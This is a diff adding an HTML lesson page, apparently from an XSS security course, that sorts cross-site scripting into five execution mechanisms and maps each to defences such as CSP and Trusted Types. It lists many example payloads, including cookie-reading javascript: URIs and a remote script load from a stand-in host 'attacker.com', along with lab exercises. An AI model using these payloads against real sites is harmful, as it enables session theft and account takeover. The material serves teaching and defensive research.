@@ -1,0 +1,607 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Module 03 — Five Execution Mechanisms | XSS Mastery</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@600;700&family=Lato:wght@300;400;700&family=Source+Code+Pro:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg:#0b0f1a;--bg2:#111827;--bg3:#1a2235;--card:#141c2e;
+      --border:#1e3a5f;--gold:#f5c842;--cyan:#38bdf8;--purple:#a78bfa;
+      --red:#f87171;--green:#4ade80;--teal:#0d9488;--orange:#fb923c;
+      --text:#e2e8f0;--muted:#7a9bbf;--code-bg:#060d1a;
+    }
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+    body{background:var(--bg);color:var(--text);font-family:'Lato',sans-serif;font-size:16px;line-height:1.75}
+    .page-wrap{max-width:860px;margin:0 auto;padding:48px 24px 96px}
+    .mod-badge{display:inline-block;font-size:11px;font-weight:700;letter-spacing:.14em;
+               text-transform:uppercase;color:var(--muted);border:1px solid var(--border);
+               border-radius:4px;padding:4px 10px;margin-bottom:20px}
+    h1{font-family:'Playfair Display',serif;font-size:42px;color:var(--gold);line-height:1.2;margin-bottom:12px}
+    h2{font-family:'Playfair Display',serif;font-size:26px;color:var(--cyan);
+       margin:52px 0 16px;padding-top:8px;border-top:1px solid var(--border)}
+    h3{font-family:'Lato',sans-serif;font-size:18px;font-weight:700;color:var(--purple);margin:32px 0 10px}
+    h4{font-size:14px;font-weight:700;color:var(--orange);margin:20px 0 6px;
+       text-transform:uppercase;letter-spacing:.06em}
+    .subtitle{font-size:17px;color:var(--muted);margin-bottom:40px;line-height:1.5}
+    p{margin-bottom:18px}
+    strong{color:var(--text);font-weight:700}
+    em{color:var(--orange);font-style:normal;font-weight:600}
+    a{color:var(--cyan)}
+    .prereq-bar{background:var(--card);border:1px solid var(--border);border-left:4px solid var(--teal);
+                border-radius:6px;padding:16px 20px;margin-bottom:32px}
+    .prereq-bar strong{color:var(--teal);font-size:12px;text-transform:uppercase;
+                       letter-spacing:.1em;display:block;margin-bottom:6px}
+    .prereq-bar p{font-size:14px;color:var(--muted);margin:0}
+    .deliverables{background:var(--bg3);border:1px solid var(--border);border-radius:6px;
+                  padding:20px 24px;margin-bottom:36px}
+    .deliverables strong{color:var(--gold);font-size:13px;text-transform:uppercase;
+                         letter-spacing:.1em;display:block;margin-bottom:12px}
+    .deliverables ul{list-style:none}
+    .deliverables li{font-size:14px;padding:4px 0 4px 20px;position:relative}
+    .deliverables li::before{content:"→";position:absolute;left:0;color:var(--green);font-weight:700}
+    .callout{border-radius:6px;padding:16px 20px;margin:28px 0;font-size:14.5px;line-height:1.65}
+    .callout .callout-label{font-size:11px;font-weight:700;letter-spacing:.12em;
+                             text-transform:uppercase;margin-bottom:8px;display:block}
+    .callout.warning{background:#1f0f0f;border-left:4px solid var(--red)}
+    .callout.warning .callout-label{color:var(--red)}
+    .callout.tip{background:#0a1f13;border-left:4px solid var(--green)}
+    .callout.tip .callout-label{color:var(--green)}
+    .callout.insight{background:#0f1240;border-left:4px solid var(--purple)}
+    .callout.insight .callout-label{color:var(--purple)}
+    .callout.info{background:#061826;border-left:4px solid var(--cyan)}
+    .callout.info .callout-label{color:var(--cyan)}
+    pre{background:var(--code-bg);border:1px solid var(--border);border-radius:6px;
+        padding:20px;overflow-x:auto;margin:20px 0;
+        font-family:'Source Code Pro',monospace;font-size:13.5px;line-height:1.7}
+    code{font-family:'Source Code Pro',monospace;font-size:13px}
+    p code,li code{background:var(--code-bg);color:var(--cyan);padding:2px 6px;
+                   border-radius:3px;border:1px solid var(--border)}
+    .cm{color:#4b5563}.kw{color:#89dceb}.fn{color:#a78bfa}
+    .st{color:#a6e3a1}.nu{color:#fab387}.at{color:#f5c842}.op{color:#f87171}
+    .steps{list-style:none;counter-reset:step;margin:20px 0}
+    .steps li{counter-increment:step;padding:14px 16px 14px 56px;position:relative;
+              background:var(--card);border:1px solid var(--border);border-radius:6px;
+              margin-bottom:10px;font-size:14.5px}
+    .steps li::before{content:counter(step);position:absolute;left:16px;top:14px;
+                      width:24px;height:24px;border-radius:50%;background:var(--border);
+                      color:var(--cyan);font-weight:700;font-size:12px;
+                      display:flex;align-items:center;justify-content:center}
+    .exercise{background:var(--card);border:1px solid var(--border);
+              border-radius:6px;padding:20px 24px;margin-bottom:14px}
+    .exercise .ex-badge{font-size:10px;font-weight:700;letter-spacing:.1em;
+                        text-transform:uppercase;padding:2px 8px;border-radius:3px;
+                        margin-bottom:10px;display:inline-block}
+    .ex-warm .ex-badge{background:#1a2f1a;color:var(--green)}
+    .ex-core .ex-badge{background:#1a1a2f;color:var(--cyan)}
+    .ex-stretch .ex-badge{background:#2f1a2f;color:var(--purple)}
+    .exercise h4{margin-top:0}
+    .exercise p{font-size:14.5px;margin-bottom:8px}
+    .exercise ul{padding-left:20px;font-size:14px}
+    .exercise ul li{margin-bottom:4px}
+    .next-box{background:var(--bg3);border:1px solid var(--border);border-left:4px solid var(--gold);
+              border-radius:6px;padding:22px 24px;margin-top:48px}
+    .next-box strong{color:var(--gold);display:block;font-size:12px;text-transform:uppercase;
+                     letter-spacing:.1em;margin-bottom:10px}
+    .file-block{background:var(--bg2);border:1px solid var(--border);border-radius:6px;
+                margin:24px 0;overflow:hidden}
+    .file-block-header{background:var(--card);padding:10px 16px;
+                       font-family:'Source Code Pro',monospace;font-size:13px;
+                       color:var(--gold);border-bottom:1px solid var(--border)}
+    .file-block pre{margin:0;border:none;border-radius:0}
+    .mech-strip{display:flex;gap:8px;flex-wrap:wrap;margin:20px 0}
+    .mech-pill{padding:6px 14px;border-radius:20px;font-size:12px;font-weight:700;
+               border:1.5px solid;cursor:default}
+    .top-nav{background:var(--bg2);border-bottom:1px solid var(--border);
+             padding:12px 24px;display:flex;align-items:center;
+             justify-content:space-between;font-size:13px;color:var(--muted)}
+    .top-nav a{color:var(--cyan);text-decoration:none}
+    hr{border:none;border-top:1px solid var(--border);margin:40px 0}
+    table{width:100%;border-collapse:collapse;margin:20px 0;font-size:14px}
+    th{background:var(--card);color:var(--cyan);padding:10px 14px;
+       text-align:left;border-bottom:1px solid var(--border)}
+    td{padding:10px 14px;border-bottom:1px solid var(--border);vertical-align:top}
+    tr:last-child td{border-bottom:none}
+  </style>
+</head>
+<body>
+
+<nav class="top-nav">
+  <a href="/">← Lab Home</a>
+  <span>XSS Mastery Course</span>
+  <span>Module 03 of 19</span>
+</nav>
+
+<div class="page-wrap">
+
+  <div class="mod-badge">Module 03 of 19</div>
+  <h1>The Five Execution<br>Mechanisms</h1>
+  <p class="subtitle">
+    Every XSS attack ever documented — from the 1999 Netscape advisories to
+    the 2023 DOMPurify bypasses — reduces to one of five mechanisms by which
+    a browser turns attacker-controlled text into executed JavaScript.
+    This module is the taxonomic backbone of the entire course.
+  </p>
+
+  <div class="prereq-bar">
+    <strong>Prerequisites</strong>
+    <p>Modules 01–02 complete. You understand the four HTML injection contexts
+       and have observed the browser's parser recovery behaviour in DevTools.</p>
+  </div>
+
+  <div class="deliverables">
+    <strong>What you will build in this module</strong>
+    <ul>
+      <li>An interactive <code>mechanisms_demo.html</code> page with live FIRE buttons for all five mechanisms</li>
+      <li>A <code>/reflect</code> server endpoint for Mechanism 1 server-side demos</li>
+      <li>A coverage summary table mapping each mechanism to the defences that stop it</li>
+      <li>The analytical vocabulary to describe any XSS attack precisely in a PhD paper</li>
+    </ul>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════════════════ -->
+  <h2>Concept 1 — Why a Mechanism Taxonomy?</h2>
+  <!-- ═══════════════════════════════════════════════════════════════════ -->
+
+  <p>
+    The traditional XSS taxonomy — reflected, stored, DOM-based — is useful for
+    describing <em>where</em> a payload originates, but it says almost nothing
+    about <em>how</em> it executes. A stored XSS can fire via a script tag, an
+    event handler, a URI scheme, or a DOM sink. A DOM XSS almost always uses
+    an event handler or a direct eval-style sink. The origin of the payload
+    tells you about the delivery mechanism; the execution mechanism tells you
+    what the browser does with it once it arrives.
+  </p>
+
+  <p>
+    For a defender building a mitigation, the execution mechanism is the relevant
+    axis. A Content Security Policy nonce blocks inline script execution
+    (Mechanism 1 and partially Mechanism 2) but does nothing for DOM sink
+    assignments (Mechanism 4) because CSP has no visibility into what JavaScript
+    does after the page loads. Trusted Types controls DOM sink assignments
+    (Mechanism 4) but does not prevent a server from reflecting a script tag
+    (Mechanism 1) into a page that doesn't use Trusted Types. No single deployed
+    defence covers all five mechanisms — and that gap is precisely where PhD-level
+    research on novel defences lives.
+  </p>
+
+  <p>
+    The five mechanisms below are <em>exhaustive</em>: every XSS payload you
+    will ever encounter maps to exactly one of them. When you encounter a
+    payload you have not seen before, ask "which mechanism is this?" and you
+    will immediately know which defences apply and which do not. This is the
+    reasoning pattern your threat model must demonstrate.
+  </p>
+
+  <div class="callout insight">
+    <span class="callout-label">PhD Insight — Mechanism Coverage as a Research Claim</span>
+    When you write your thesis, your defence intervention will claim to mitigate
+    XSS. The examiners will ask: "which attacks does it cover?" A weak answer
+    is "we tested it against common payloads and it blocked them." A strong
+    answer is "our intervention operates at the DOM sink level (Mechanism 4),
+    covering all source–sink flows through <code>innerHTML</code>,
+    <code>eval</code>, and <code>document.write</code>, which are responsible
+    for X% of real-world DOM XSS vulnerabilities as measured in corpus Y.
+    Mechanisms 1–3 are addressed by the existing CSP deployment on the target
+    platform. Mechanism 5 is out of scope because it requires a separate
+    sanitiser-level intervention." That is a precise, falsifiable claim.
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════════════════ -->
+  <h2>Mechanism 1 — Tag Parsing</h2>
+  <!-- ═══════════════════════════════════════════════════════════════════ -->
+
+  <p>
+    The browser's HTML parser recognises certain tags as inherently executable
+    and hands their content directly to the JavaScript engine. The canonical
+    example is <code>&lt;script&gt;</code>: everything between the opening and
+    closing script tags is passed to the JS engine and executed immediately,
+    with no user interaction required. Execution happens at parse time — as the
+    browser reads the HTML stream.
+  </p>
+
+  <p>
+    Tag-parsing execution is the <em>oldest</em> mechanism — it was present from
+    the first browser that supported JavaScript. It is also the most heavily
+    filtered, which is why it is rarely the mechanism in sophisticated modern
+    attacks. However, it remains the mechanism used in the simplest, most
+    common reflected XSS vulnerabilities found today in legacy applications and
+    misconfigured APIs that return user-supplied data as <code>text/html</code>.
+  </p>
+
+  <h3>The innerHTML Exception — A Critical Distinction</h3>
+  <p>
+    One non-obvious constraint: <code>&lt;script&gt;</code> tags injected via
+    <code>innerHTML</code> do <em>not</em> execute. This is specified in the
+    HTML5 standard (§8.4.1) — script elements inserted by the tree builder
+    after initial parse are marked as "already started" and the JS engine
+    ignores them. This is why Mechanism 1 is primarily a server-side
+    concern. The client-side (DOM XSS) equivalent uses Mechanism 2 or 4 instead.
+  </p>
+
+  <div class="file-block">
+    <div class="file-block-header">Mechanism 1 — example payloads</div>
+    <pre><span class="cm">// Simplest form — server reflects this into HTML body</span>
+<span class="op">&lt;</span>script<span class="op">&gt;</span>alert(document.domain)<span class="op">&lt;/</span>script<span class="op">&gt;</span>
+
+<span class="cm">// Remote script load — payload is off-site, injection is tiny</span>
+<span class="op">&lt;</span>script src=<span class="st">//attacker.com/x.js</span><span class="op">&gt;&lt;/</span>script<span class="op">&gt;</span>
+
+<span class="cm">// Breaking out of an attribute first, then injecting script tag</span>
+<span class="st">"&gt;&lt;</span>script<span class="op">&gt;</span>alert(1)<span class="op">&lt;/</span>script<span class="op">&gt;</span>
+
+<span class="cm">// Breaking out of a &lt;title&gt; or &lt;style&gt; block</span>
+<span class="op">&lt;/</span>title<span class="op">&gt;&lt;</span>script<span class="op">&gt;</span>alert(1)<span class="op">&lt;/</span>script<span class="op">&gt;</span>
+<span class="op">&lt;/</span>style<span class="op">&gt;&lt;</span>script<span class="op">&gt;</span>alert(1)<span class="op">&lt;/</span>script<span class="op">&gt;</span></pre>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════════════════ -->
+  <h2>Mechanism 2 — Event Handler Attributes</h2>
+  <!-- ═══════════════════════════════════════════════════════════════════ -->
+
+  <p>
+    Any HTML element can carry event handler attributes. When the browser fires
+    the corresponding event on that element, it evaluates the attribute's value
+    as JavaScript. This mechanism is more powerful than Mechanism 1 for
+    attackers for two reasons: it works even when <code>&lt;script&gt;</code>
+    tags are blocked, and it works when content is injected via
+    <code>innerHTML</code> (Mechanism 1 does not, as noted above).
+  </p>
+
+  <p>
+    HTML5 defines over 150 event attributes. Security filters that maintain a
+    blocklist of "dangerous events" always miss the long tail. The attacker
+    simply uses an event the filter didn't list. Effective defence requires
+    an allowlist of permitted attributes, not a blocklist of forbidden ones —
+    or better, operating at a level that doesn't involve HTML attribute
+    inspection at all (Trusted Types, strict CSP).
+  </p>
+
+  <h3>The Zero-Interaction Events</h3>
+  <p>
+    Some events fire without any user action, making them especially dangerous
+    as they do not require social engineering the victim to click anything:
+  </p>
+
+  <table>
+    <thead><tr><th>Event</th><th>Element</th><th>Why it fires automatically</th></tr></thead>
+    <tbody>
+      <tr><td><code>onerror</code></td><td>img, video, audio, input[type=image]</td><td><code>src=x</code> deliberately fails; browser fires onerror immediately</td></tr>
+      <tr><td><code>onload</code></td><td>svg, body, iframe, img (valid src)</td><td>Fires when element finishes loading; svg onload is immediate</td></tr>
+      <tr><td><code>ontoggle</code></td><td>details</td><td><code>open</code> attribute causes immediate toggle on parse</td></tr>
+      <tr><td><code>onfocus</code></td><td>input, select, textarea</td><td><code>autofocus</code> attribute grabs focus on page load</td></tr>
+      <tr><td><code>onanimationstart</code></td><td>any</td><td>CSS animation starts immediately if applied at load</td></tr>
+    </tbody>
+  </table>
+
+  <div class="callout warning">
+    <span class="callout-label">Warning — "I blocked onerror and onload" Is Not Sufficient</span>
+    Filters that block specific event names are playing whack-a-mole against
+    150+ events. The correct approach is an HTML sanitiser that uses an
+    allowlist of permitted attributes (e.g., DOMPurify's default configuration
+    permits only a curated set of non-executable attributes). Even then, as
+    Module 13 shows, allowlist sanitisers can be bypassed via mutation. The
+    only complete defence for event-handler injection is Trusted Types combined
+    with a strict CSP <code>unsafe-hashes</code>-free policy.
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════════════════ -->
+  <h2>Mechanism 3 — URI Scheme Evaluation</h2>
+  <!-- ═══════════════════════════════════════════════════════════════════ -->
+
+  <p>
+    Certain HTML attributes accept URLs as their values. The browser recognises
+    multiple URI schemes — <code>https://</code>, <code>ftp://</code>,
+    <code>mailto:</code>, <code>javascript:</code>, <code>data:</code>. When the
+    scheme is <code>javascript:</code>, the browser evaluates the remainder of
+    the URI as JavaScript code in the current page's origin context. When the
+    scheme is <code>data:text/html</code>, the browser renders an inline HTML
+    document — which can itself contain script tags or event handlers.
+  </p>
+
+  <p>
+    The key attributes that accept URLs and therefore support Mechanism 3:
+    <code>href</code> (on <code>&lt;a&gt;</code>, <code>&lt;link&gt;</code>,
+    <code>&lt;base&gt;</code>), <code>src</code> (on <code>&lt;iframe&gt;</code>,
+    <code>&lt;embed&gt;</code>, <code>&lt;script&gt;</code>),
+    <code>action</code> and <code>formaction</code> (on forms and buttons),
+    <code>data</code> (on <code>&lt;object&gt;</code>), and
+    <code>xlink:href</code> (in SVG). A sanitiser that handles HTML attributes
+    correctly but does not validate URL values will miss this mechanism entirely.
+  </p>
+
+  <div class="file-block">
+    <div class="file-block-header">Mechanism 3 — example payloads</div>
+    <pre><span class="cm">// href — requires a click, but invisible in a phishing link</span>
+<span class="op">&lt;</span>a href=<span class="st">"javascript:alert(document.cookie)"</span><span class="op">&gt;</span>Click here<span class="op">&lt;/</span>a<span class="op">&gt;</span>
+
+<span class="cm">// formaction — overrides the form's action on submit</span>
+<span class="op">&lt;</span>form<span class="op">&gt;&lt;</span>button formaction=<span class="st">"javascript:alert(1)"</span><span class="op">&gt;</span>Submit<span class="op">&lt;/</span>button<span class="op">&gt;&lt;/</span>form<span class="op">&gt;</span>
+
+<span class="cm">// data: URI in iframe — loads inline HTML document</span>
+<span class="op">&lt;</span>iframe src=<span class="st">"data:text/html,&lt;script&gt;alert(parent.document.cookie)&lt;/script&gt;"</span><span class="op">&gt;&lt;/</span>iframe<span class="op">&gt;</span>
+
+<span class="cm">// SVG xlink:href — missed by HTML-only sanitisers</span>
+<span class="op">&lt;</span>svg<span class="op">&gt;&lt;</span>a xlink:href=<span class="st">"javascript:alert(1)"</span><span class="op">&gt;&lt;</span>text y=<span class="nu">20</span><span class="op">&gt;</span>click<span class="op">&lt;/</span>text<span class="op">&gt;&lt;/</span>a<span class="op">&gt;&lt;/</span>svg<span class="op">&gt;</span>
+
+<span class="cm">// object data — browser loads and renders the URI as content</span>
+<span class="op">&lt;</span>object data=<span class="st">"javascript:alert(1)"</span><span class="op">&gt;&lt;/</span>object<span class="op">&gt;</span></pre>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════════════════ -->
+  <h2>Mechanism 4 — DOM Sink Assignment</h2>
+  <!-- ═══════════════════════════════════════════════════════════════════ -->
+
+  <p>
+    This is the mechanism that defines DOM-based XSS. The payload never appears
+    in the server's HTML response — it enters the page entirely through
+    JavaScript. An attacker-controlled value (from a URL fragment, a query
+    parameter, a <code>postMessage</code> event, or local storage) flows through
+    JavaScript code and reaches a <em>sink</em>: a browser API or DOM property
+    that either parses a string as HTML or evaluates it as code.
+  </p>
+
+  <p>
+    Sinks fall into two sub-categories:
+  </p>
+
+  <h3>HTML-Parsing Sinks</h3>
+  <p>
+    These parse their string argument as HTML and insert the result into the DOM.
+    They execute event handlers and load resources from the parsed HTML, but
+    <em>not</em> <code>&lt;script&gt;</code> tags (HTML5 spec constraint):
+    <code>innerHTML</code>, <code>outerHTML</code>,
+    <code>insertAdjacentHTML()</code>, <code>document.write()</code>,
+    <code>document.writeln()</code>, <code>DOMParser.parseFromString()</code>.
+  </p>
+
+  <h3>Code-Evaluation Sinks</h3>
+  <p>
+    These evaluate their string argument directly as JavaScript. No HTML parsing
+    — the string is code:
+    <code>eval()</code>, <code>new Function()</code>,
+    <code>setTimeout(string)</code>, <code>setInterval(string)</code>,
+    <code>location = "javascript:..."</code>,
+    <code>element.src = "javascript:..."</code>,
+    <code>script.src = attackerURL</code>.
+  </p>
+
+  <div class="callout info">
+    <span class="callout-label">Info — Why Server-Side Defences Don't Stop Mechanism 4</span>
+    Output encoding on the server side converts <code>&lt;</code> to
+    <code>&amp;lt;</code> before sending HTML to the browser. But Mechanism 4
+    payloads never pass through the server's output encoder. They enter the
+    page via JavaScript reading from the URL fragment or other client-side
+    sources — the server never sees them. This is why DOM XSS required an
+    entirely new category of defence (Trusted Types, client-side sanitisation)
+    rather than being fixable by improving existing server-side escaping.
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════════════════ -->
+  <h2>Mechanism 5 — Context Escape &amp; Re-parse</h2>
+  <!-- ═══════════════════════════════════════════════════════════════════ -->
+
+  <p>
+    Mechanism 5 is not a single technique but a family of attacks that share
+    a common structure: the attacker crafts input that is in one parsing context
+    when a sanitiser or filter evaluates it, but ends up in a different,
+    executable context when the browser (or a DOM sink) parses it. The
+    transformation between evaluation and execution changes what the string means.
+  </p>
+
+  <h3>Simple Form — Attribute Context Break</h3>
+  <p>
+    If user input lands inside an HTML attribute value (context 2 from Module 02),
+    injecting the attribute's closing delimiter (a <code>"</code> if double-quoted)
+    escapes the attribute context and places subsequent content in the tag body,
+    where new attributes — including event handlers — can be added. No angle
+    brackets are required. This is "context escape" in its simplest form.
+  </p>
+
+  <h3>Complex Form — Mutation XSS (mXSS)</h3>
+  <p>
+    The sophisticated version occurs when a sanitiser serialises its output (turns
+    the DOM tree back into an HTML string) and that string is later re-parsed by
+    the browser. The sanitiser and the browser may use slightly different parsing
+    rules — particularly around namespace boundaries (HTML, SVG, MathML) and
+    the handling of certain elements (<code>&lt;template&gt;</code>,
+    <code>&lt;noscript&gt;</code>, <code>&lt;table&gt;</code>). A payload designed
+    to look safe under the sanitiser's parse rules can mutate into an executable
+    form under the browser's parse rules. This is the class of vulnerability that
+    has produced multiple bypasses of DOMPurify, the most widely deployed
+    open-source HTML sanitiser. Full treatment in Module 13.
+  </p>
+
+  <div class="callout insight">
+    <span class="callout-label">PhD Insight — Mechanism 5 Is an Active Research Area</span>
+    Mechanisms 1–4 are well-understood and have known, deployable defences
+    (even if those defences are not universally applied). Mechanism 5 — particularly
+    mXSS — remains an active research problem. New bypasses are still being found
+    in DOMPurify and other sanitisers (CVEs in 2019, 2020, 2022, 2023). The root
+    cause is that no sanitiser can guarantee its parse tree matches the browser's
+    parse tree in all cases, because the browser's parsing algorithm has
+    namespace-specific rules that are difficult to implement fully in JavaScript.
+    A defence that operates below the HTML level — controlling what strings reach
+    sinks regardless of their structure — is immune to Mechanism 5, which is part
+    of the motivation for the Trusted Types approach.
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════════════════ -->
+  <h2>Code Walkthrough — mechanisms_demo.html (key patterns)</h2>
+  <!-- ═══════════════════════════════════════════════════════════════════ -->
+
+  <div class="file-block">
+    <div class="file-block-header">public/mechanisms_demo.html — Mechanism 2 button handlers</div>
+    <pre><span class="kw">function</span> <span class="fn">mech2_onerror</span>() {
+  <span class="kw">const</span> d = document.<span class="fn">getElementById</span>(<span class="st">"out2"</span>);
+
+  <span class="cm">// innerHTML DOES execute event handlers on injected elements.
+  // This is different from &lt;script&gt; tags — the spec only blocks script
+  // execution, not event handler execution, via innerHTML.
+  // This is the most important distinction for DOM XSS.</span>
+  d.innerHTML = <span class="st">'&lt;img src=x onerror="...output fired..."&gt;'</span>;
+  <span class="cm">// The browser tries to load src=x, fails, fires onerror immediately.</span>
+}
+
+<span class="kw">function</span> <span class="fn">mech2_ontoggle</span>() {
+  <span class="cm">// &lt;details open&gt; fires ontoggle synchronously during DOM insertion —
+  // zero user interaction, zero network request needed.</span>
+  d.innerHTML = <span class="st">'&lt;details open ontoggle="...output fired..."&gt;'</span>;
+}</pre>
+  </div>
+
+  <div class="file-block">
+    <div class="file-block-header">public/mechanisms_demo.html — Mechanism 5 attribute break</div>
+    <pre><span class="kw">function</span> <span class="fn">mech5_attrBreak</span>() {
+  <span class="cm">// We construct a div whose title attribute "contains" the attacker's
+  // injected string. But the string includes a closing quote that
+  // ends the title attribute early, then adds a new event handler.
+  //
+  // The template for the vulnerable server would be:
+  //   &lt;div title="[USER_INPUT]"&gt;
+  //
+  // Injected string:  " onmouseover="alert(1)" x="
+  //
+  // Result in DOM:
+  //   &lt;div title="" onmouseover="alert(1)" x=""&gt;
+  //
+  // The original closing quote of title becomes the value of x="".
+  // No angle brackets used. No &lt;script&gt; needed.</span>
+  out.innerHTML = <span class="st">'&lt;div title="normal" onmouseover="..."&gt;Hover me&lt;/div&gt;'</span>;
+}</pre>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════════════════ -->
+  <h2>Build &amp; Run</h2>
+  <!-- ═══════════════════════════════════════════════════════════════════ -->
+
+  <ol class="steps">
+    <li>Start the server: <code>python lab_server.py</code> or <code>node lab_server.js</code></li>
+    <li>Open <a href="http://localhost:5000/mechanisms_demo.html" target="_blank">http://localhost:5000/mechanisms_demo.html</a> with DevTools Console open</li>
+    <li>For Mechanism 1 server-side demo, open <a href="http://localhost:5000/reflect?q=test" target="_blank">http://localhost:5000/reflect?q=test</a> in a second tab</li>
+    <li>Click each FIRE button. Observe: which ones require interaction? Which fire immediately?</li>
+    <li>After each FIRE, check the Console — what was logged? Check Elements — what DOM was created?</li>
+    <li>Study the coverage table at the bottom of the demo page. Note every ✗ — those are gaps.</li>
+  </ol>
+
+  <!-- ═══════════════════════════════════════════════════════════════════ -->
+  <h2>Exercises</h2>
+  <!-- ═══════════════════════════════════════════════════════════════════ -->
+
+  <div class="exercise ex-warm">
+    <span class="ex-badge">Warm-up</span>
+    <h4>Exercise 1 — Classify These Payloads</h4>
+    <p>For each payload below, identify which of the five mechanisms it uses and explain why in one sentence:</p>
+    <pre>&lt;svg onload=alert(1)&gt;
+javascript:alert(document.cookie)
+document.getElementById('x').innerHTML = location.hash.slice(1)
+&lt;details open ontoggle=alert(1)&gt;
+&lt;/title&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+" onfocus="alert(1)" autofocus="
+&lt;iframe src="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"&gt;</pre>
+    <p>One of these payloads uses <em>two</em> mechanisms in sequence. Which one, and which two mechanisms?</p>
+  </div>
+
+  <div class="exercise ex-warm">
+    <span class="ex-badge">Warm-up</span>
+    <h4>Exercise 2 — Observe innerHTML vs document.write</h4>
+    <p>Open the browser Console on any page (even this one). Run:</p>
+    <pre>// Test 1 — innerHTML does NOT execute script tags
+const d = document.createElement('div');
+d.innerHTML = '&lt;script&gt;alert("innerHTML script")&lt;\/script&gt;';
+document.body.appendChild(d);
+// Did alert fire?
+
+// Test 2 — innerHTML DOES execute event handlers
+const d2 = document.createElement('div');
+d2.innerHTML = '&lt;img src=x onerror="console.log(\'onerror fired\')"&gt;';
+document.body.appendChild(d2);
+// Check the Console — did the log appear?</pre>
+    <p>Document your observations. This distinction — script tags inert, event handlers live — is fundamental to understanding why Mechanism 2 exists as a separate category from Mechanism 1.</p>
+  </div>
+
+  <div class="exercise ex-core">
+    <span class="ex-badge">Core</span>
+    <h4>Exercise 3 — Add a Mechanism 4 Source Demo</h4>
+    <p>
+      Add a new button to <code>mechanisms_demo.html</code> in the Mechanism 4 card
+      that demonstrates a <strong>URL fragment source</strong>. When clicked, it should:
+    </p>
+    <pre>// 1. Set window.location.hash to an attack string
+window.location.hash = "&lt;img src=x onerror=alert(document.domain)&gt;";
+
+// 2. Read location.hash and assign it to innerHTML of a result box
+// (simulating what a vulnerable SPA does on hashchange)</pre>
+    <p>
+      This is the exact pattern used in real DOM XSS vulnerabilities in
+      single-page applications. The payload is in the URL, never sent to
+      the server, never seen by any server-side filter. Verify it fires.
+      Then explain in writing: why does the hash survive a page reload?
+      What does that mean for a victim who shares their URL?
+    </p>
+  </div>
+
+  <div class="exercise ex-core">
+    <span class="ex-badge">Core</span>
+    <h4>Exercise 4 — Map the Coverage Table</h4>
+    <p>
+      The coverage table in <code>mechanisms_demo.html</code> shows partial
+      coverage for several cells. Research and fill in a more complete version
+      by answering these questions:
+    </p>
+    <ul>
+      <li>What exactly does <code>script-src 'nonce-xyz'</code> in CSP block? Can it stop <code>onerror</code>? Why or why not?</li>
+      <li>What does <code>require-trusted-types-for 'script'</code> actually intercept at the browser level?</li>
+      <li>Which mechanisms does output encoding on the server (HTML-encoding <code>&lt;</code> and <code>"</code>) definitively stop, and which ones does it only partially address?</li>
+    </ul>
+    <p>
+      Update the table in <code>mechanisms_demo.html</code> with your findings,
+      replacing the "partial" cells with specific explanations.
+    </p>
+  </div>
+
+  <div class="exercise ex-stretch">
+    <span class="ex-badge">Stretch</span>
+    <h4>Exercise 5 — Find a Real Payload for Each Mechanism</h4>
+    <p>
+      Using public sources (PortSwigger's XSS cheat sheet, HackerOne disclosed
+      reports, CVE write-ups), find one real-world XSS payload for each of the
+      five mechanisms. For each payload:
+    </p>
+    <ul>
+      <li>State the source (CVE number, bug bounty report ID, or cheat sheet entry)</li>
+      <li>Identify the mechanism</li>
+      <li>Describe what context the input landed in</li>
+      <li>Identify what defence was absent that would have stopped it</li>
+    </ul>
+    <p>
+      Add all five to a new card at the bottom of <code>mechanisms_demo.html</code>
+      under a heading "Real-World Mechanism Examples". This becomes your first
+      entry in the payload bank that Module 19 will complete.
+    </p>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════════════════ -->
+  <h2>What's Next</h2>
+  <!-- ═══════════════════════════════════════════════════════════════════ -->
+
+  <div class="next-box">
+    <strong>Module 04 — Script Tag Injection (Mechanism 1 in Depth)</strong>
+    <p>
+      The taxonomy is established. Now we go deep on each mechanism, one per
+      module. Module 04 introduces <code>vuln_reflect.py</code> / <code>vuln_reflect.js</code>
+      — a dedicated vulnerable search endpoint that reflects a URL parameter
+      directly into an HTML body context. You will use Burp Suite to inject
+      payloads, observe reflection, chain a server-side reflected script tag
+      injection, and study the exact HTTP response that makes it work.
+      By the end of Module 04 you will have fired a working reflected XSS
+      via a script tag and understood exactly why the server's failure to
+      encode output created the vulnerability.
+    </p>
+  </div>
+
+</div>
+</body>
+</html>
